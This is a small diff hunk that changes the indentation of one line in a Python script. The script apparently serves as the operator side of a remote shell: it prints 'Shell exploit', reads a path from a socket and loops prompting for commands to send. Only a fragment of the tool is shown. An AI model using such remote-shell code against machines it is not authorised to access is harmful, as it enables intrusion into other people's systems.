@@ -15,7 +15,7 @@ while True:
     print("Shell exploit...................")
     while True:
      try:
-       path = data.recv(1024).decode("utf-8")
+      path = data.recv(1024).decode("utf-8")
       cmd = input(f"{path}>")
       if cmd == 'exit':
         data.close()
